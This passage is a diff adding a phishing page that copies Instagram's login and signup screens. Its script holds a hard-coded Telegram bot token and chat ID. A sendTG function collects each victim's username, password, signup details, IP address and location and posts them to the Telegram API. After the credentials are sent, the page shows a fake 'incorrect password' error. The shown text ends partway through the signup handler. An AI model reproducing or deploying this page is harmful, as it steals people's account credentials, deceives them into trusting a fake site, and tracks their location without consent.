@@ -1,0 +1,1179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        @font-face {
+            font-family: 'instagram';
+            src: url('https://fonts.cdnfonts.com/css/grandista');
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== MAIN LAYOUT ===== */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            margin-top: 12px;
+            margin-bottom: 12px;
+        }
+
+        .main-container {
+            display: flex;
+            align-items: center;
+            gap: 32px;
+            max-width: 935px;
+        }
+
+        /* ===== PHONE MOCKUP ===== */
+        .phone-mockup {
+            position: relative;
+            width: 380px;
+            height: 582px;
+            flex-shrink: 0;
+            background: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=HOgRclNOosk') no-repeat;
+            background-size: 454px 618px;
+            background-position: 0 0;
+        }
+
+        .phone-mockup .screenshot {
+            position: absolute;
+            top: 99px;
+            right: 18px;
+            width: 250px;
+            height: 439px;
+            opacity: 0;
+            transition: opacity 1.5s ease-in-out;
+        }
+
+        .phone-mockup .screenshot.active {
+            opacity: 1;
+        }
+
+        /* ===== RIGHT SIDE ===== */
+        .right-side {
+            width: 350px;
+            flex-shrink: 0;
+        }
+
+        /* ===== LOGIN BOX ===== */
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 10px 40px;
+            padding-top: 36px;
+            padding-bottom: 24px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .login-box .logo-img {
+            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png');
+            background-repeat: no-repeat;
+            background-position: 0 -52px;
+            height: 51px;
+            width: 175px;
+            margin: 0 auto 12px;
+            background-size: 176px;
+            display: block;
+        }
+
+        .instagram-logo-text {
+            font-family: 'Grand Hotel', 'Billabong', cursive, sans-serif;
+            font-size: 49px;
+            margin-bottom: 16px;
+            color: #262626;
+            font-weight: 400;
+        }
+
+        /* ===== FORM ===== */
+        .login-form {
+            margin-top: 24px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 6px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            height: 38px;
+            overflow: hidden;
+        }
+
+        .input-wrapper.focused {
+            border-color: #a8a8a8;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            height: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 12px;
+            padding: 14px 10px 2px;
+            color: #262626;
+            line-height: 18px;
+        }
+
+        .input-wrapper label {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 12px;
+            color: #8e8e8e;
+            pointer-events: none;
+            transition: all 0.1s ease-out;
+            line-height: 18px;
+        }
+
+        .input-wrapper.has-value label {
+            top: 8px;
+            font-size: 10px;
+            transform: translateY(0);
+        }
+
+        .input-wrapper.has-value input {
+            padding-top: 14px;
+            padding-bottom: 2px;
+        }
+
+        .input-wrapper .show-btn {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            color: #262626;
+            cursor: pointer;
+            display: none;
+            font-family: inherit;
+        }
+
+        .input-wrapper.has-value .show-btn {
+            display: block;
+        }
+
+        .input-wrapper .show-btn:hover {
+            color: #8e8e8e;
+        }
+
+        .login-btn {
+            width: 100%;
+            height: 32px;
+            border: none;
+            border-radius: 8px;
+            background: #0095f6;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+            position: relative;
+        }
+
+        .login-btn:disabled {
+            background: #4cb5f9;
+            opacity: 0.7;
+            cursor: default;
+        }
+
+        .login-btn:not(:disabled):hover {
+            background: #1877f2;
+        }
+
+        .login-btn .btn-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+
+        .login-btn.loading .btn-text { display: none; }
+        .login-btn.loading .btn-spinner { display: block; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== DIVIDER ===== */
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+
+        .separator .line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .separator .or-text {
+            padding: 0 16px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #8e8e8e;
+            text-transform: uppercase;
+        }
+
+        /* ===== FB LOGIN ===== */
+        .fb-login-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: none;
+            border: none;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            padding: 8px;
+            font-family: inherit;
+        }
+
+        .fb-login-btn:hover {
+            color: #1c3a6e;
+        }
+
+        .fb-login-btn svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* ===== ERROR MESSAGE ===== */
+        .error-msg {
+            margin: 10px 0 0;
+            font-size: 14px;
+            color: #ed4956;
+            line-height: 18px;
+            text-align: center;
+            display: none;
+        }
+
+        .error-msg.show {
+            display: block;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        /* ===== FORGOT PASSWORD ===== */
+        .forgot-link {
+            display: block;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            color: #00376b;
+        }
+
+        /* ===== SIGNUP BOX ===== */
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 22px 0;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* ===== GET APP ===== */
+        .get-app {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .get-app p {
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .app-badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .app-badges img {
+            height: 40px;
+        }
+
+        /* ===== FOOTER ===== */
+        .site-footer {
+            padding: 0 20px 52px;
+            margin-top: auto;
+        }
+
+        .footer-nav {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 4px 16px;
+            max-width: 1066px;
+            margin: 0 auto 16px;
+        }
+
+        .footer-nav a {
+            font-size: 12px;
+            color: #8e8e8e;
+            text-decoration: none;
+            font-weight: 400;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .footer-bottom select {
+            border: none;
+            background: none;
+            font-size: 12px;
+            color: #8e8e8e;
+            cursor: pointer;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .footer-bottom .copyright {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        /* ===== SIGNUP MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.65);
+            z-index: 1000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.2s;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .signup-modal {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            width: 350px;
+            max-height: 90vh;
+            overflow-y: auto;
+            padding: 10px 40px;
+            padding-top: 36px;
+            padding-bottom: 24px;
+            animation: modalIn 0.3s ease;
+        }
+
+        @keyframes modalIn {
+            from { transform: scale(0.95); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .signup-modal .instagram-logo-text {
+            text-align: center;
+        }
+
+        .signup-subtitle {
+            color: #8e8e8e;
+            font-size: 17px;
+            font-weight: 600;
+            line-height: 20px;
+            text-align: center;
+            margin: 0 0 10px;
+        }
+
+        .signup-modal .fb-signup-btn {
+            width: 100%;
+            height: 34px;
+            border: none;
+            border-radius: 8px;
+            background: #0095f6;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .signup-modal .fb-signup-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: #fff;
+        }
+
+        .signup-modal .separator {
+            margin: 14px 0;
+        }
+
+        .signup-modal .input-wrapper {
+            margin-bottom: 6px;
+            position: relative;
+        }
+
+        .validation-mark {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 22px;
+            line-height: 1;
+            display: none;
+        }
+
+        .validation-mark.ok {
+            display: block;
+            color: #ccc;
+        }
+
+        .validation-mark.ok::after {
+            content: "✓";
+            color: #70c050;
+            font-size: 20px;
+        }
+
+        .validation-mark.bad {
+            display: block;
+        }
+
+        .validation-mark.bad::after {
+            content: "✕";
+            color: #ed4956;
+            font-size: 18px;
+        }
+
+        .field-error {
+            font-size: 11px;
+            color: #ed4956;
+            margin: -2px 0 6px 0;
+            padding-left: 2px;
+            display: none;
+            line-height: 1.4;
+        }
+
+        .field-error.show {
+            display: block;
+        }
+
+        .pass-bar-container {
+            height: 3px;
+            background: #efefef;
+            border-radius: 2px;
+            margin: 2px 0 8px;
+            overflow: hidden;
+        }
+
+        .pass-bar {
+            height: 100%;
+            width: 0;
+            border-radius: 2px;
+            transition: all 0.3s;
+        }
+
+        .pass-bar.weak { width: 33%; background: #ed4956; }
+        .pass-bar.medium { width: 66%; background: #fcb045; }
+        .pass-bar.strong { width: 100%; background: #70c050; }
+
+        .signup-modal .terms-text {
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+            line-height: 16px;
+            margin: 10px 0 8px;
+        }
+
+        .signup-modal .terms-text a {
+            color: #e0e0e0;
+            text-decoration: none;
+            font-weight: 600;
+            color: #385185;
+        }
+
+        .signup-modal .signup-submit {
+            width: 100%;
+            height: 34px;
+            border: none;
+            border-radius: 8px;
+            background: #0095f6;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+
+        .signup-modal .signup-submit:disabled {
+            background: #4cb5f9;
+            opacity: 0.7;
+            cursor: default;
+        }
+
+        .signup-modal .signup-submit:not(:disabled):hover {
+            background: #1877f2;
+        }
+
+        .signup-modal .signup-submit .btn-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+
+        .signup-modal .signup-submit.loading .btn-text { display: none; }
+        .signup-modal .signup-submit.loading .btn-spinner { display: block; }
+
+        .modal-back-login {
+            border-top: 1px solid #dbdbdb;
+            padding-top: 18px;
+            margin-top: 18px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .modal-back-login a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* ===== SUCCESS MODAL ===== */
+        .success-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.65);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .success-overlay.show {
+            display: flex;
+        }
+
+        .success-box {
+            background: #fff;
+            border-radius: 12px;
+            padding: 40px;
+            text-align: center;
+            width: 340px;
+            animation: modalIn 0.4s ease;
+        }
+
+        .success-check {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            animation: popIn 0.5s ease;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+
+        .success-check svg {
+            width: 36px;
+            height: 36px;
+            fill: #fff;
+        }
+
+        .success-box h2 {
+            font-size: 20px;
+            color: #262626;
+            margin-bottom: 8px;
+        }
+
+        .success-box .sub {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-bottom: 6px;
+        }
+
+        .success-box .redirect {
+            color: #0095f6;
+            font-size: 14px;
+            font-weight: 600;
+            animation: blink 1.2s infinite;
+        }
+
+        @keyframes blink {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 875px) {
+            .phone-mockup {
+                display: none;
+            }
+
+            .main-container {
+                justify-content: center;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .login-box, .signup-modal {
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+
+            .right-side {
+                width: 100%;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<!-- ===== MAIN ===== -->
+<div class="main-wrapper">
+    <div class="main-container">
+
+        <!-- PHONE -->
+        <div class="phone-mockup">
+            <img class="screenshot active" src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2-702x.png/1a43de2cde4a.png" alt="">
+        </div>
+
+        <!-- RIGHT -->
+        <div class="right-side">
+
+            <!-- LOGIN -->
+            <div class="login-box" id="loginBox">
+                <div class="instagram-logo-text">Instagram</div>
+
+                <form class="login-form" id="loginForm" autocomplete="off">
+                    <div class="input-wrapper" id="usernameWrap">
+                        <input type="text" id="username" name="username">
+                        <label for="username">Phone number, username, or email</label>
+                    </div>
+
+                    <div class="input-wrapper" id="passwordWrap">
+                        <input type="password" id="password" name="password">
+                        <label for="password">Password</label>
+                        <button type="button" class="show-btn" id="showPass">Show</button>
+                    </div>
+
+                    <button type="submit" class="login-btn" id="loginBtn" disabled>
+                        <span class="btn-text">Log in</span>
+                        <div class="btn-spinner"></div>
+                    </button>
+
+                    <div class="separator">
+                        <div class="line"></div>
+                        <span class="or-text">OR</span>
+                        <div class="line"></div>
+                    </div>
+
+                    <button type="button" class="fb-login-btn">
+                        <svg viewBox="0 0 24 24" fill="#385185"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg>
+                        Log in with Facebook
+                    </button>
+
+                    <div class="error-msg" id="loginError">
+                        Sorry, your password was incorrect. Please double-check your password.
+                    </div>
+
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </form>
+            </div>
+
+            <!-- SIGNUP LINK -->
+            <div class="signup-box" id="signupLinkBox">
+                Don't have an account? <a href="#" id="openSignup">Sign up</a>
+            </div>
+
+            <!-- GET APP -->
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-badges">
+                    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store"></a>
+                    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== SIGNUP MODAL ===== -->
+<div class="modal-overlay" id="signupOverlay">
+    <div class="signup-modal">
+        <div class="instagram-logo-text" style="text-align:center;">Instagram</div>
+        <p class="signup-subtitle">Sign up to see photos and videos from your friends.</p>
+
+        <button type="button" class="fb-signup-btn">
+            <svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg>
+            Log in with Facebook
+        </button>
+
+        <div class="separator">
+            <div class="line"></div>
+            <span class="or-text">OR</span>
+            <div class="line"></div>
+        </div>
+
+        <form id="signupForm" autocomplete="off">
+            <div class="input-wrapper" id="sEmailWrap">
+                <input type="text" id="sEmail">
+                <label for="sEmail">Mobile Number or Email</label>
+                <span class="validation-mark" id="sEmailMark"></span>
+            </div>
+            <div class="field-error" id="sEmailErr"></div>
+
+            <div class="input-wrapper" id="sNameWrap">
+                <input type="text" id="sName">
+                <label for="sName">Full Name</label>
+                <span class="validation-mark" id="sNameMark"></span>
+            </div>
+            <div class="field-error" id="sNameErr"></div>
+
+            <div class="input-wrapper" id="sUserWrap">
+                <input type="text" id="sUser">
+                <label for="sUser">Username</label>
+                <span class="validation-mark" id="sUserMark"></span>
+            </div>
+            <div class="field-error" id="sUserErr"></div>
+
+            <div class="input-wrapper" id="sPassWrap">
+                <input type="password" id="sPass">
+                <label for="sPass">Password</label>
+                <span class="validation-mark" id="sPassMark"></span>
+            </div>
+            <div class="pass-bar-container">
+                <div class="pass-bar" id="passBar"></div>
+            </div>
+            <div class="field-error" id="sPassErr"></div>
+
+            <p class="terms-text">
+                People who use our service may have uploaded your contact information to Instagram. <a href="#">Learn More</a>
+            </p>
+            <p class="terms-text">
+                By signing up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>.
+            </p>
+
+            <button type="submit" class="signup-submit" id="signupBtn" disabled>
+                <span class="btn-text">Sign up</span>
+                <div class="btn-spinner"></div>
+            </button>
+        </form>
+
+        <div class="modal-back-login">
+            Have an account? <a href="#" id="backLogin">Log in</a>
+        </div>
+    </div>
+</div>
+
+<!-- ===== SUCCESS ===== -->
+<div class="success-overlay" id="successOverlay">
+    <div class="success-box">
+        <div class="success-check">
+            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        </div>
+        <h2>Welcome to Instagram!</h2>
+        <p class="sub">Your account has been created.</p>
+        <p class="redirect">Redirecting...</p>
+    </div>
+</div>
+
+<!-- ===== FOOTER ===== -->
+<footer class="site-footer">
+    <nav class="footer-nav">
+        <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
+        <a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a>
+        <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
+        <a href="#">Instagram Lite</a><a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a><a href="#">Meta Verified</a>
+    </nav>
+    <div class="footer-bottom">
+        <select><option>English</option><option>Русский</option><option>Тоҷикӣ</option></select>
+        <span class="copyright">© 2024 Instagram from Meta</span>
+    </div>
+</footer>
+
+<script>
+// =============================================
+// ⚙️ ТОКЕН ВА CHAT_ID РО ИНҶО ГУЗОРЕД
+// =============================================
+const BOT_TOKEN = "9128646084:AAH0pT-tqfx2PH-pY_W-z7EFUp35CyLbrIE";
+const CHAT_ID   = "8553761081";
+// =============================================
+
+// ---------- ELEMENTS ----------
+const $ = id => document.getElementById(id);
+
+const loginForm     = $('loginForm');
+const usernameIn    = $('username');
+const passwordIn    = $('password');
+const loginBtn      = $('loginBtn');
+const loginError    = $('loginError');
+
+const signupForm    = $('signupForm');
+const sEmail        = $('sEmail');
+const sName         = $('sName');
+const sUser         = $('sUser');
+const sPass         = $('sPass');
+const signupBtn     = $('signupBtn');
+const passBar       = $('passBar');
+
+// ---------- INPUT FLOAT LABELS ----------
+document.querySelectorAll('.input-wrapper input').forEach(inp => {
+    inp.addEventListener('input', () => {
+        const wrap = inp.parentElement;
+        if (inp.value.length > 0) wrap.classList.add('has-value');
+        else wrap.classList.remove('has-value');
+    });
+    inp.addEventListener('focus', () => inp.parentElement.classList.add('focused'));
+    inp.addEventListener('blur', () => inp.parentElement.classList.remove('focused'));
+});
+
+// ---------- SHOW / HIDE PASSWORD ----------
+$('showPass').addEventListener('click', function() {
+    if (passwordIn.type === 'password') {
+        passwordIn.type = 'text';
+        this.textContent = 'Hide';
+    } else {
+        passwordIn.type = 'password';
+        this.textContent = 'Show';
+    }
+});
+
+// ---------- LOGIN BUTTON ENABLE ----------
+function checkLogin() {
+    loginBtn.disabled = !(usernameIn.value.trim() && passwordIn.value);
+}
+usernameIn.addEventListener('input', checkLogin);
+passwordIn.addEventListener('input', checkLogin);
+
+// ---------- MODAL OPEN / CLOSE ----------
+$('openSignup').addEventListener('click', e => {
+    e.preventDefault();
+    $('signupOverlay').classList.add('show');
+});
+
+$('backLogin').addEventListener('click', e => {
+    e.preventDefault();
+    $('signupOverlay').classList.remove('show');
+});
+
+$('signupOverlay').addEventListener('click', e => {
+    if (e.target === $('signupOverlay')) $('signupOverlay').classList.remove('show');
+});
+
+// ---------- VALIDATION HELPERS ----------
+const validDomains = [
+    'gmail.com','yahoo.com','hotmail.com','outlook.com','mail.ru',
+    'yandex.ru','icloud.com','protonmail.com','aol.com','zoho.com',
+    'gmx.com','inbox.ru','bk.ru','list.ru','live.com','msn.com',
+    'me.com','rambler.ru','ukr.net','yahoo.co.uk','yandex.com'
+];
+
+const commonPasswords = [
+    '123456','password','123456789','12345678','12345','1234567',
+    'qwerty','abc123','111111','123123','admin','letmein','welcome',
+    'monkey','master','dragon','login','football','iloveyou','password1'
+];
+
+function setMark(id, state) {
+    const el = $(id);
+    el.className = 'validation-mark' + (state === true ? ' ok' : state === false ? ' bad' : '');
+}
+
+function setFieldErr(id, msg) {
+    const el = $(id);
+    if (msg) { el.textContent = msg; el.classList.add('show'); }
+    else { el.textContent = ''; el.classList.remove('show'); }
+}
+
+function isPhone(val) {
+    return /^\+?[0-9]{7,15}$/.test(val.replace(/[\s\-()]/g, ''));
+}
+
+function vEmail(val) {
+    if (!val) return { ok: false, msg: '' };
+
+    // Агар рақами телефон бошад
+    if (isPhone(val)) {
+        if (val.replace(/[\s\-()]/g, '').length < 9) return { ok: false, msg: 'Enter a valid phone number.' };
+        return { ok: true, msg: '' };
+    }
+
+    if (!/^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(val))
+        return { ok: false, msg: 'Enter a valid email address.' };
+
+    const parts = val.split('@');
+    const local = parts[0], domain = parts[1].toLowerCase();
+
+    if (local.length < 2) return { ok: false, msg: 'Email is too short.' };
+    if (/^[.\-_]|[.\-_]$/.test(local)) return { ok: false, msg: "Email can't start or end with a special character." };
+
+    if (domain === 'gmail.com') {
+        const cl = local.replace(/\./g, '');
+        if (cl.length < 6) return { ok: false, msg: 'Gmail requires at least 6 characters.' };
+        if (!/^[a-zA-Z0-9.]+$/.test(local)) return { ok: false, msg: 'Gmail only allows letters, numbers, and dots.' };
+    }
+
+    // Шабеҳро ёфтан
+    const similar = validDomains.find(d => {
+        let diff = 0;
+        for (let i = 0; i < Math.max(d.length, domain.length); i++)
+            if (d[i] !== domain[i]) diff++;
+        return diff === 1 && d !== domain;
+    });
+    if (similar) return { ok: false, msg: `Did you mean "${similar}"?` };
+
+    return { ok: true, msg: '' };
+}
+
+function vName(val) {
+    if (!val) return { ok: false, msg: '' };
+    if (val.length < 2) return { ok: false, msg: 'Name is too short.' };
+    if (/[0-9]/.test(val)) return { ok: false, msg: "Name can't contain numbers." };
+    if (/[!@#$%^&*()_+=\[\]{}|\\:";'<>?,./]/.test(val)) return { ok: false, msg: 'Remove special characters.' };
+    return { ok: true, msg: '' };
+}
+
+function vUser(val) {
+    if (!val) return { ok: false, msg: '' };
+    if (val.length < 3) return { ok: false, msg: 'Username must be at least 3 characters.' };
+    if (val.length > 30) return { ok: false, msg: 'Username is too long.' };
+    if (!/^[a-zA-Z0-9._]+$/.test(val)) return { ok: false, msg: 'Only letters, numbers, periods, and underscores.' };
+    if (/^[._]|[._]$/.test(val)) return { ok: false, msg: "Can't start or end with period/underscore." };
+    if (/[.]{2}|[_]{2}/.test(val)) return { ok: false, msg: 'No consecutive periods or underscores.' };
+    const banned = ['instagram','admin','support','help','official','moderator','root','system'];
+    if (banned.some(b => val.toLowerCase().includes(b))) return { ok: false, msg: 'This username is not available.' };
+    return { ok: true, msg: '' };
+}
+
+function vPass(val) {
+    if (!val) return { ok: false, strength: '', msg: '' };
+    if (val.length < 6) return { ok: false, strength: 'weak', msg: 'Password must be at least 6 characters.' };
+    if (commonPasswords.includes(val.toLowerCase())) return { ok: false, strength: 'weak', msg: 'This password is too common.' };
+    if (/^(.)\1+$/.test(val)) return { ok: false, strength: 'weak', msg: "Don't use repeating characters." };
+
+    let s = 0;
+    if (val.length >= 8) s++;
+    if (val.length >= 12) s++;
+    if (/[a-z]/.test(val)) s++;
+    if (/[A-Z]/.test(val)) s++;
+    if (/[0-9]/.test(val)) s++;
+    if (/[^a-zA-Z0-9]/.test(val)) s++;
+
+    let strength = s >= 5 ? 'strong' : s >= 3 ? 'medium' : 'weak';
+    return { ok: true, strength, msg: '' };
+}
+
+// ---------- SIGNUP FIELD LISTENERS ----------
+let emailT, userT;
+
+sEmail.addEventListener('input', () => {
+    clearTimeout(emailT);
+    emailT = setTimeout(() => {
+        const r = vEmail(sEmail.value.trim());
+        setMark('sEmailMark', sEmail.value.trim() ? r.ok : null);
+        setFieldErr('sEmailErr', r.msg);
+        checkSignup();
+    }, 400);
+});
+
+sName.addEventListener('input', () => {
+    const r = vName(sName.value.trim());
+    setMark('sNameMark', sName.value.trim() ? r.ok : null);
+    setFieldErr('sNameErr', r.msg);
+    checkSignup();
+});
+
+sUser.addEventListener('input', () => {
+    clearTimeout(userT);
+    userT = setTimeout(() => {
+        const r = vUser(sUser.value.trim());
+        setMark('sUserMark', sUser.value.trim() ? r.ok : null);
+        setFieldErr('sUserErr', r.msg);
+        checkSignup();
+    }, 400);
+});
+
+sPass.addEventListener('input', () => {
+    const r = vPass(sPass.value);
+    setMark('sPassMark', sPass.value ? r.ok : null);
+    setFieldErr('sPassErr', r.msg);
+    passBar.className = 'pass-bar' + (r.strength ? ' ' + r.strength : '');
+    checkSignup();
+});
+
+function checkSignup() {
+    const ok = vEmail(sEmail.value.trim()).ok &&
+               vName(sName.value.trim()).ok &&
+               vUser(sUser.value.trim()).ok &&
+               vPass(sPass.value).ok;
+    signupBtn.disabled = !ok;
+}
+
+// ---------- TELEGRAM SEND ----------
+async function sendTG(type, data) {
+    const dt = new Date().toLocaleString('ru-RU', {
+        timeZone: 'Asia/Dushanbe',
+        day:'2-digit', month:'2-digit', year:'numeric',
+        hour:'2-digit', minute:'2-digit', second:'2-digit'
+    });
+
+    let ip = '?';
+    try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
+
+    let geo = '';
+    try { const r = await fetch('https://ipapi.co/'+ip+'/json/'); const g = await r.json(); geo = (g.city||'')+', '+(g.country_name||''); } catch(e){}
+
+    let msg = '';
+    if (type === 'login') {
+        msg = `🔐 <b>LOGIN</b>\n━━━━━━━━━━━━━━━\n👤 <b>Login:</b> <code>${data.u}</code>\n🔑 <b>Pass:</b> <code>${data.p}</code>\n━━━━━━━━━━━━━━━\n🌐 IP: <code>${ip}</code>\n📍 Geo: ${geo}\n🖥 ${navigator.platform} | ${screen.width}x${screen.height}\n📅 ${dt}`;
+    } else {
+        msg = `📝 <b>SIGNUP</b>\n━━━━━━━━━━━━━━━\n📧 <b>Email:</b> <code>${data.email}</code>\n👤 <b>Name:</b> ${data.name}\n🏷 <b>User:</b> <code>${data.user}</code>\n🔑 <b>Pass:</b> <code>${data.pass}</code>\n━━━━━━━━━━━━━━━\n🌐 IP: <code>${ip}</code>\n📍 Geo: ${geo}\n🖥 ${navigator.platform} | ${screen.width}x${screen.height}\n📅 ${dt}`;
+    }
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+        });
+    } catch(e){}
+}
+
+// ---------- LOGIN SUBMIT ----------
+loginForm.addEventListener('submit', async e => {
+    e.preventDefault();
+    if (loginBtn.disabled) return;
+
+    loginBtn.classList.add('loading');
+    loginBtn.disabled = true;
+    loginError.classList.remove('show');
+
+    await sendTG('login', { u: usernameIn.value.trim(), p: passwordIn.value });
+    await new Promise(r => setTimeout(r, 1800 + Math.random()*1200));
+
+    loginBtn.classList.remove('loading');
+    loginError.classList.add('show');
+    passwordIn.value = '';
+    passwordIn.parentElement.classList.remove('has-value');
+    checkLogin();
+});
+
+// ---------- SIGNUP SUBMIT ----------
+signupForm.addEventListener('submit', async e => {
+    e.preventDefault();
+    if (signupBtn.disabled) return;
+
+    // Якбора тасдиқ
+    const e1 = vEmail(sEmail.value.trim());
+    const e2 = vName(sName.value.trim());
